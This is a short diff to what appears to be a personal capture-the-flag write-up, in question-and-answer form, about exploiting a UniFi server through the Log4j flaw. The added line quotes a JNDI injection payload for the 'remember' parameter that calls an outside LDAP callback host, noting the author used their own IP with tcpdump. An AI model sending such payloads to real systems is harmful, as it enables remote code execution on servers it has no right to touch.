@@ -52,7 +52,8 @@ Q8: What port is the MongoDB service running on?
 
 A: 
 
-So, according to this article (https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)
+So, according to this article (https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) in the remember parameter goes a payload ("${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\"), but as i'm not using that tool (dnslog.cn) i just use my ip and tcpdump
+
 
 Q9: What is the default database name for UniFi applications?
 
